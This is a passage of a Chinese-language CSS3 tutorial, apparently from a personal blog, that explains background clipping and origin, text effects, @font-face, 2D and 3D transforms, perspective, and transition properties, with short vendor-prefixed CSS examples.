<li>content-box    背景图像相对于内容框来定位。<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>:<span class="built_in">url</span>(bg_flower.gif);</span><br><span class="line">  <span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line">  <span class="attribute">background-size</span>:<span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">-webkit-background-origin</span>:content-box; <span class="comment">/* Safari */</span></span><br><span class="line">  <span class="attribute">background-origin</span>:content-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="CSS3-多重背景图片"><a href="#CSS3-多重背景图片" class="headerlink" title="CSS3 多重背景图片"></a>CSS3 多重背景图片</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123; </span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">url</span>(bg_flower.gif),<span class="built_in">url</span>(bg_flower_2.gif);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="background-clip-属性"><a href="#background-clip-属性" class="headerlink" title="background-clip 属性"></a>background-clip 属性</h2><p>属性规定背景的绘制区域。<br>默认值：    border-box<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">background-clip: border-box|padding-box|content-box;</span><br></pre></td></tr></table></figure></p>
<p>border-box    背景被裁剪到边框盒。<br>padding-box    背景被裁剪到内边距框。<br>content-box    背景被裁剪到内容框。</p>
<h1 id="CSS3-文本效果"><a href="#CSS3-文本效果" class="headerlink" title="CSS3 文本效果"></a>CSS3 文本效果</h1><h2 id="CSS3-文本效果-1"><a href="#CSS3-文本效果-1" class="headerlink" title="CSS3 文本效果"></a>CSS3 文本效果</h2><p>CSS3 包含多个新的文本特性。<br>在本章中，您将学到如下文本属性：</p>
<ol>
<li>text-shadow</li>
<li>word-wrap</li>
</ol>
<h2 id="CSS3-文本阴影"><a href="#CSS3-文本阴影" class="headerlink" title="CSS3 文本阴影"></a>CSS3 文本阴影</h2><p>在 CSS3 中，text-shadow 可向文本应用阴影。<br>您能够规定水平阴影、垂直阴影、模糊距离，以及阴影的颜色：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span> <span class="number">#FF0000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CSS3-自动换行"><a href="#CSS3-自动换行" class="headerlink" title="CSS3 自动换行"></a>CSS3 自动换行</h2><p>单词太长的话就可能无法超出某个区域自动换行<br>在 CSS3 中，word-wrap 属性允许您允许文本强制文本进行换行 - 即使这意味着会对单词进行拆分。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">word-wrap</span>:break-word;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>暂略???<br>hanging-punctuation    规定标点字符是否位于线框之外。    3<br>punctuation-trim    规定是否对标点字符进行修剪。    3<br>text-align-last    设置如何对齐最后一行或紧挨着强制换行符之前的行。    3<br>text-emphasis    向元素的文本应用重点标记以及重点标记的前景色。    3<br>text-justify    规定当 text-align 设置为 “justify” 时所使用的对齐方法。    3<br>text-outline    规定文本的轮廓。    3<br>text-overflow    规定当文本溢出包含元素时发生的事情。    3<br>text-shadow    向文本添加阴影。    3<br>text-wrap    规定文本的换行规则。    3<br>word-break    规定非中日韩文本的换行规则。    3<br>word-wrap    允许对长的不可分割的单词进行分割并换行到下一行。    3</p>
<h2 id="CSS3-font-face-规则"><a href="#CSS3-font-face-规则" class="headerlink" title="CSS3 @font-face 规则"></a>CSS3 @font-face 规则</h2><p>在 CSS3 之前，web 设计师必须使用已在用户计算机上安装好的字体。</p>
<p>通过 CSS3，web 设计师可以使用他们喜欢的任意字体。</p>
<p>当您您找到或购买到希望使用的字体时，可将该字体文件存放到 web 服务器上，它会在需要时被自动下载到用户的计算机上。</p>
<p>您“自己的”的字体是在 CSS3 @font-face 规则中定义的。</p>
<h2 id="使用您需要的字体"><a href="#使用您需要的字体" class="headerlink" title="使用您需要的字体"></a>使用您需要的字体</h2><p>在新的 @font-face 规则中，您必须首先定义字体的名称（比如 myFirstFont），然后指向该字体文件。</p>
<p>如需为 HTML 元素使用字体，请通过 font-family 属性来引用字体的名称 (myFirstFont)：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span> </span><br><span class="line"><span class="css">  <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line">    font-family: myFirstFont;</span><br><span class="line">    src: url('Sansation_Light.ttf'),</span><br><span class="line">        url('Sansation_Light.eot'); /* IE9+ */</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  div &#123;</span><br><span class="line"><span class="css">    <span class="selector-tag">font-family</span><span class="selector-pseudo">:myFirstFont</span>;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>使用粗体字体<br>您必须为粗体文本添加另一个包含描述符的 @font-face：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: myFirstFont;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'Sansation_Bold.ttf'</span>),</span><br><span class="line">      <span class="built_in">url</span>(<span class="string">'Sansation_Bold.eot'</span>); <span class="comment">/* IE9+ */</span></span><br><span class="line">  <span class="attribute">font-weight</span>:bold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>文件 “Sansation_Bold.ttf” 是另一个字体文件，它包含了 Sansation 字体的粗体字符。</p>
<p>只要 font-family 为 “myFirstFont” 的文本需要显示为粗体，浏览器就会使用该字体。</p>
<p>通过这种方式，我们可以为相同的字体设置许多 @font-face 规则。</p>
<h2 id="CSS3-字体描述符"><a href="#CSS3-字体描述符" class="headerlink" title="CSS3 字体描述符"></a>CSS3 字体描述符</h2><p><img src="https://mfaying.github.io/static/images/css3教程/1.jpg" alt></p>
<h1 id="CSS3-2D-转换"><a href="#CSS3-2D-转换" class="headerlink" title="CSS3 2D 转换"></a>CSS3 2D 转换</h1><h2 id="CSS3-转换"><a href="#CSS3-转换" class="headerlink" title="CSS3 转换"></a>CSS3 转换</h2><p>转换是使元素改变形状、尺寸和位置的一种效果。</p>
<p>您可以使用 2D 或 3D 转换来转换您的元素。</p>
<p>通过 CSS3 转换，我们能够对元素进行移动、缩放、转动、拉长或拉伸。</p>
<h2 id="2D-转换"><a href="#2D-转换" class="headerlink" title="2D 转换"></a>2D 转换</h2><p>您将学到如下 2D 转换方法：</p>
<ol>
<li>translate()</li>
<li>rotate()</li>
<li>scale()</li>
<li>skew()</li>
<li>matrix()</li>
</ol>
<h2 id="translate-方法"><a href="#translate-方法" class="headerlink" title="translate() 方法"></a>translate() 方法</h2><p>通过 translate() 方法，元素从其当前位置移动，根据给定的 left（x 坐标） 和 top（y 坐标） 位置参数<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">50px</span>,<span class="number">100px</span>);</span><br><span class="line">  <span class="attribute">-ms-transform</span>: <span class="built_in">translate</span>(<span class="number">50px</span>,<span class="number">100px</span>);		<span class="comment">/* IE 9 */</span></span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">translate</span>(<span class="number">50px</span>,<span class="number">100px</span>);	<span class="comment">/* Safari and Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transform</span>: <span class="built_in">translate</span>(<span class="number">50px</span>,<span class="number">100px</span>);		<span class="comment">/* Opera */</span></span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">translate</span>(<span class="number">50px</span>,<span class="number">100px</span>);		<span class="comment">/* Firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>值 translate(50px,100px) 把元素从左侧移动 50 像素，从顶端移动 100 像素。</p>
<h2 id="rotate-方法"><a href="#rotate-方法" class="headerlink" title="rotate() 方法"></a>rotate() 方法</h2><p>通过 rotate() 方法，元素顺时针旋转给定的角度。允许负值，元素将逆时针旋转。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">30deg</span>);</span><br><span class="line">  <span class="attribute">-ms-transform</span>: <span class="built_in">rotate</span>(<span class="number">30deg</span>);		<span class="comment">/* IE 9 */</span></span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">rotate</span>(<span class="number">30deg</span>);	<span class="comment">/* Safari and Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transform</span>: <span class="built_in">rotate</span>(<span class="number">30deg</span>);		<span class="comment">/* Opera */</span></span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">rotate</span>(<span class="number">30deg</span>);		<span class="comment">/* Firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>值 rotate(30deg) 把元素顺时针旋转 30 度。</p>
<h2 id="scale-方法"><a href="#scale-方法" class="headerlink" title="scale() 方法"></a>scale() 方法</h2><p>通过 scale() 方法，元素的尺寸会增加或减少，根据给定的宽度（X 轴）和高度（Y 轴）参数：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line">  <span class="attribute">-ms-transform</span>: <span class="built_in">scale</span>(<span class="number">2</span>,<span class="number">4</span>);	<span class="comment">/* IE 9 */</span></span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">scale</span>(<span class="number">2</span>,<span class="number">4</span>);	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transform</span>: <span class="built_in">scale</span>(<span class="number">2</span>,<span class="number">4</span>);	<span class="comment">/* Opera */</span></span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">scale</span>(<span class="number">2</span>,<span class="number">4</span>);	<span class="comment">/* Firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>值 scale(2,4) 把宽度转换为原始尺寸的 2 倍，把高度转换为原始高度的 4 倍。</p>
<h2 id="skew-方法"><a href="#skew-方法" class="headerlink" title="skew() 方法"></a>skew() 方法</h2><p>通过 skew() 方法，元素翻转给定的角度，根据给定的水平线（X 轴）和垂直线（Y 轴）参数：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">skew</span>(<span class="number">30deg</span>,<span class="number">20deg</span>);</span><br><span class="line">  <span class="attribute">-ms-transform</span>: <span class="built_in">skew</span>(<span class="number">30deg</span>,<span class="number">20deg</span>);	<span class="comment">/* IE 9 */</span></span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">skew</span>(<span class="number">30deg</span>,<span class="number">20deg</span>);	<span class="comment">/* Safari and Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transform</span>: <span class="built_in">skew</span>(<span class="number">30deg</span>,<span class="number">20deg</span>);	<span class="comment">/* Opera */</span></span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">skew</span>(<span class="number">30deg</span>,<span class="number">20deg</span>);	<span class="comment">/* Firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>值 skew(30deg,20deg) 围绕 X 轴把元素翻转 30 度，围绕 Y 轴翻转 20 度。</p>
<h2 id="matrix-方法"><a href="#matrix-方法" class="headerlink" title="matrix() 方法"></a>matrix() 方法</h2><p>matrix() 方法把所有 2D 转换方法组合在一起。<br>matrix() 方法需要六个参数，包含数学函数，允许您：旋转、缩放、移动以及倾斜元素。<br>使用 matrix 方法将 div 元素旋转 30 度：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>:<span class="built_in">matrix</span>(<span class="number">0.866</span>,<span class="number">0.5</span>,-<span class="number">0.5</span>,<span class="number">0.866</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="attribute">-ms-transform</span>:<span class="built_in">matrix</span>(<span class="number">0.866</span>,<span class="number">0.5</span>,-<span class="number">0.5</span>,<span class="number">0.866</span>,<span class="number">0</span>,<span class="number">0</span>);		<span class="comment">/* IE 9 */</span></span><br><span class="line">  <span class="attribute">-moz-transform</span>:<span class="built_in">matrix</span>(<span class="number">0.866</span>,<span class="number">0.5</span>,-<span class="number">0.5</span>,<span class="number">0.866</span>,<span class="number">0</span>,<span class="number">0</span>);	<span class="comment">/* Firefox */</span></span><br><span class="line">  <span class="attribute">-webkit-transform</span>:<span class="built_in">matrix</span>(<span class="number">0.866</span>,<span class="number">0.5</span>,-<span class="number">0.5</span>,<span class="number">0.866</span>,<span class="number">0</span>,<span class="number">0</span>);	<span class="comment">/* Safari and Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transform</span>:<span class="built_in">matrix</span>(<span class="number">0.866</span>,<span class="number">0.5</span>,-<span class="number">0.5</span>,<span class="number">0.866</span>,<span class="number">0</span>,<span class="number">0</span>);		<span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>下面的表格列出了所有的转换属性：</p>
<ol>
<li>transform    transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。<br>默认值：    none<br>语法<figure class="highlight"><table><tr><td class="code"><pre><span class="line">transform: none|transform-functions;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>none    定义不进行转换。<br>matrix(n,n,n,n,n,n)    定义 2D 转换，使用六个值的矩阵。<br>matrix3d(n,n,n,n,n,n,n,n,n,n,n,n,n,n,n,n)    定义 3D 转换，使用 16 个值的 4x4 矩阵。<br>translate(x,y)    定义 2D 转换。<br>translate3d(x,y,z)    定义 3D 转换。<br>translateX(x)    定义转换，只是用 X 轴的值。<br>translateY(y)    定义转换，只是用 Y 轴的值。<br>translateZ(z)    定义 3D 转换，只是用 Z 轴的值。<br>scale(x,y)    定义 2D 缩放转换。<br>scale3d(x,y,z)    定义 3D 缩放转换。<br>scaleX(x)    通过设置 X 轴的值来定义缩放转换。<br>scaleY(y)    通过设置 Y 轴的值来定义缩放转换。<br>scaleZ(z)    通过设置 Z 轴的值来定义 3D 缩放转换。<br>rotate(angle)    定义 2D 旋转，在参数中规定角度。<br>rotate3d(x,y,z,angle)    定义 3D 旋转。<br>rotateX(angle)    定义沿着 X 轴的 3D 旋转。<br>rotateY(angle)    定义沿着 Y 轴的 3D 旋转。<br>rotateZ(angle)    定义沿着 Z 轴的 3D 旋转。<br>skew(x-angle,y-angle)    定义沿着 X 和 Y 轴的 2D 倾斜转换。<br>skewX(angle)    定义沿着 X 轴的 2D 倾斜转换。<br>skewY(angle)    定义沿着 Y 轴的 2D 倾斜转换。<br>perspective(n)    为 3D 转换元素定义透视视图。</p>
<ol start="2">
<li>transform-origin    允许你改变被转换元素的位置。<br>2D 转换元素能够改变元素 x 和 y 轴。3D 转换元素还能改变其 Z 轴。<br>注释：该属性必须与 transform 属性一同使用。<br>默认值：50% 50% 0<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform-origin</span>: <span class="selector-tag">x-axis</span> <span class="selector-tag">y-axis</span> <span class="selector-tag">z-axis</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>值|描述</p>
<ol>
<li>x-axis    定义视图被置于 X 轴的何处。可能的值：left、center、right、length、%</li>
<li>y-axis<br>定义视图被置于 Y 轴的何处。可能的值：top、center、bottom、length、%</li>
<li>z-axis<br>定义视图被置于 Z 轴的何处。可能的值：length</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);</span><br><span class="line">  <span class="attribute">transform-origin</span>:<span class="number">20%</span> <span class="number">40%</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">-ms-transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>); 		<span class="comment">/* IE 9 */</span></span><br><span class="line">  <span class="attribute">-ms-transform-origin</span>:<span class="number">20%</span> <span class="number">40%</span>; 		<span class="comment">/* IE 9 */</span></span><br><span class="line"></span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-webkit-transform-origin</span>:<span class="number">20%</span> <span class="number">40%</span>;	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line"></span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);		<span class="comment">/* Firefox */</span></span><br><span class="line">  <span class="attribute">-moz-transform-origin</span>:<span class="number">20%</span> <span class="number">40%</span>;		<span class="comment">/* Firefox */</span></span><br><span class="line"></span><br><span class="line">  <span class="attribute">-o-transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);		<span class="comment">/* Opera */</span></span><br><span class="line">  <span class="attribute">-o-transform-origin</span>:<span class="number">20%</span> <span class="number">40%</span>;		<span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CSS3-3D-转换"><a href="#CSS3-3D-转换" class="headerlink" title="CSS3 3D 转换"></a>CSS3 3D 转换</h1><h2 id="3D-转换"><a href="#3D-转换" class="headerlink" title="3D 转换"></a>3D 转换</h2><p>CSS3 允许您使用 3D 转换来对元素进行格式化。<br>您将学到其中的一些 3D 转换方法：</p>
<ol>
<li>rotateX()</li>
<li>rotateY()<h2 id="rotateX-方法"><a href="#rotateX-方法" class="headerlink" title="rotateX() 方法"></a>rotateX() 方法</h2>通过 rotateX() 方法，元素围绕其 X 轴以给定的度数进行旋转。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">  transform: rotateX(120deg);</span><br><span class="line">  -webkit-transform: rotateX(120deg);	/* Safari 和 Chrome */</span><br><span class="line">  -moz-transform: rotateX(120deg);	/* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="rotateY-旋转"><a href="#rotateY-旋转" class="headerlink" title="rotateY() 旋转"></a>rotateY() 旋转</h2><p>通过 rotateY() 方法，元素围绕其 Y 轴以给定的度数进行旋转。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">130deg</span>);</span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateY</span>(<span class="number">130deg</span>);	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">rotateY</span>(<span class="number">130deg</span>);	<span class="comment">/* Firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="transform-style-属性"><a href="#transform-style-属性" class="headerlink" title="transform-style 属性"></a>transform-style 属性</h2><p>使被转换的子元素保留其 3D 转换：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">60deg</span>);</span><br><span class="line">  <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">rotateY</span>(<span class="number">60deg</span>);	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-webkit-transform-style</span>: preserve-<span class="number">3</span>d;	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>transform-style 属性规定如何在 3D 空间中呈现被嵌套的元素。<br>注释：该属性必须与 transform 属性一同使用。<br>默认值：    flat<br>语法<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">transform-style: flat|preserve-3d;</span><br></pre></td></tr></table></figure></p>
<p>值|描述</p>
<ol>
<li>flat    子元素将不保留其 3D 位置。</li>
<li>preserve-3d    子元素将保留其 3D 位置。<h2 id="perspective-属性"><a href="#perspective-属性" class="headerlink" title="perspective 属性"></a>perspective 属性</h2>设置元素被查看位置的视图：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">perspective</span>: <span class="number">500</span>;</span><br><span class="line">  <span class="attribute">-webkit-perspective</span>: <span class="number">500</span>; <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>perspective 属性定义 3D 元素距视图的距离，以像素计。该属性允许您改变 3D 元素查看 3D 元素的视图。</p>
<p>当为元素定义 perspective 属性时，其子元素会获得透视效果，而不是元素本身。<br>注释：perspective 属性只影响 3D 转换元素。<br>提示：请与 perspective-origin 属性一同使用该属性，这样您就能够改变 3D 元素的底部位置。<br>默认值：    none<br>语法<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">perspective: number|none;</span><br></pre></td></tr></table></figure></p>
<p>值|描述</p>
<ol>
<li>number    元素距离视图的距离，以像素计。</li>
<li>none    默认值。与 0 相同。不设置透视。<h2 id="perspective-origin-属性"><a href="#perspective-origin-属性" class="headerlink" title="perspective-origin 属性"></a>perspective-origin 属性</h2></li>
</ol>
<p>设置 3D 元素的基点位置：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">perspective</span>:<span class="number">150</span>;</span><br><span class="line">  <span class="attribute">perspective-origin</span>: <span class="number">10%</span> <span class="number">10%</span>;</span><br><span class="line">  <span class="attribute">-webkit-perspective</span>:<span class="number">150</span>;	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-webkit-perspective-origin</span>: <span class="number">10%</span> <span class="number">10%</span>;	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>perspective-origin 属性定义 3D 元素所基于的 X 轴和 Y 轴。该属性允许您改变 3D 元素的底部位置。</p>
<p>当为元素定义 perspective-origin 属性时，其子元素会获得透视效果，而不是元素本身。</p>
<p>注释：该属性必须与 perspective 属性一同使用，而且只影响 3D 转换元素。<br>默认值：    50% 50%<br>语法<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">perspective-origin</span>: <span class="selector-tag">x-axis</span> <span class="selector-tag">y-axis</span>;</span><br></pre></td></tr></table></figure></p>
<p>值|描述</p>
<ol>
<li>x-axis    定义该视图在 x 轴上的位置。默认值：50%。可能的值：left、center、right、length、%</li>
<li>y-axis    定义该视图在 y 轴上的位置。默认值：50%。可能的值：top、center、bottom、length、%</li>
</ol>
<h2 id="backface-visibility-属性"><a href="#backface-visibility-属性" class="headerlink" title="backface-visibility 属性"></a>backface-visibility 属性</h2><p>定义当元素不面向屏幕时是否可见。<br>如果在旋转元素不希望看到其背面时，该属性很有用。<br>默认值：    visible<br>语法<br>backface-visibility: visible|hidden;<br>值|描述</p>
<ol>
<li>visible    背面是可见的。</li>
<li>hidden    背面是不可见的。<h1 id="CSS3-过渡"><a href="#CSS3-过渡" class="headerlink" title="CSS3 过渡"></a>CSS3 过渡</h1>通过 CSS3，我们可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果。<h2 id="它如何工作？"><a href="#它如何工作？" class="headerlink" title="它如何工作？"></a>它如何工作？</h2>CSS3 过渡是元素从一种样式逐渐改变为另一种的效果。<br>要实现这一点，必须规定两项内容：</li>
<li>规定您希望把效果添加到哪个 CSS 属性上</li>
<li>规定效果的时长<br>应用于宽度属性的过渡效果，时长为 2 秒：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: width <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-moz-transition</span>: width <span class="number">2s</span>;	<span class="comment">/* Firefox 4 */</span></span><br><span class="line">  <span class="attribute">-webkit-transition</span>: width <span class="number">2s</span>;	<span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transition</span>: width <span class="number">2s</span>;	<span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>注释：如果时长未规定，则不会有过渡效果，因为默认值是 0。<br>效果开始于指定的 CSS 属性改变值时。CSS 属性改变的典型时间是鼠标指针位于元素上时：<br>例如，当鼠标指针悬浮于 <code>&lt;div&gt;</code> 元素上时：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注释：当指针移出元素时，它会逐渐变回原来的样式。</p>
<h2 id="多项改变"><a href="#多项改变" class="headerlink" title="多项改变"></a>多项改变</h2><p>如需向多个样式添加过渡效果，请添加多个属性，由逗号隔开：</p>
<p>向宽度、高度和转换添加过渡效果：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: width <span class="number">2s</span>, height <span class="number">2s</span>, transform <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-moz-transition</span>: width <span class="number">2s</span>, height <span class="number">2s</span>, -moz-transform <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-webkit-transition</span>: width <span class="number">2s</span>, height <span class="number">2s</span>, -webkit-transform <span class="number">2s</span>;</span><br><span class="line">  <span class="attribute">-o-transition</span>: width <span class="number">2s</span>, height <span class="number">2s</span>,-o-transform <span class="number">2s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="过渡属性"><a href="#过渡属性" class="headerlink" title="过渡属性"></a>过渡属性</h2><p>下面的表格列出了所有的转换属性：</p>
<h2 id="transition-属性"><a href="#transition-属性" class="headerlink" title="transition 属性"></a>transition 属性</h2><p>属性|描述<br>transition    简写属性，用于在一个属性中设置四个过渡属性。<br>transition-property    规定应用过渡的 CSS 属性的名称。<br>transition-duration    定义过渡效果花费的时间。默认是 0。<br>transition-timing-function    规定过渡效果的时间曲线。默认是 “ease”。<br>transition-delay    规定过渡效果何时开始。默认是 0。</p>
<h2 id="transition-属性-1"><a href="#transition-属性-1" class="headerlink" title="transition 属性"></a>transition 属性</h2><p>transition 属性是一个简写属性，用于设置四个过渡属性：</p>
<ol>
<li>transition-property</li>
<li>transition-duration</li>
<li>transition-timing-function</li>
<li>transition-delay<br>注释：请始终设置 transition-duration 属性，否则时长为 0，就不会产生过渡效果。<br>默认值：    all 0 ease 0<br>语法<br>transition: property duration timing-function delay;<h2 id="transition-property-属性"><a href="#transition-property-属性" class="headerlink" title="transition-property 属性"></a>transition-property 属性</h2>把鼠标指针放到 div 元素上，会产生带有平滑改变元素宽度的过渡效果：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition-property</span>:width;</span><br><span class="line">  <span class="attribute">-moz-transition-property</span>: width; <span class="comment">/* Firefox 4 */</span></span><br><span class="line">  <span class="attribute">-webkit-transition-property</span>:width; <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transition-property</span>:width; <span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>transition-property 属性规定应用过渡效果的 CSS 属性的名称。（当指定的 CSS 属性改变时，过渡效果将开始）。<br>默认值：    all<br>语法<br>transition-property: none|all|property;<br>值|描述<br>none    没有属性会获得过渡效果。<br>all    所有属性都将获得过渡效果。<br>property    定义应用过渡效果的 CSS 属性名称列表，列表以逗号分隔。</p>
<h2 id="transition-duration-属性"><a href="#transition-duration-属性" class="headerlink" title="transition-duration 属性"></a>transition-duration 属性</h2><p>让过渡效果持续 5 秒：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">transition-duration</span>: <span class="number">5s</span>;</span><br><span class="line">  <span class="attribute">-moz-transition-duration</span>: <span class="number">5s</span>; <span class="comment">/* Firefox 4 */</span></span><br><span class="line">  <span class="attribute">-webkit-transition-duration</span>: <span class="number">5s</span>; <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-transition-duration</span>: <span class="number">5s</span>; <span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
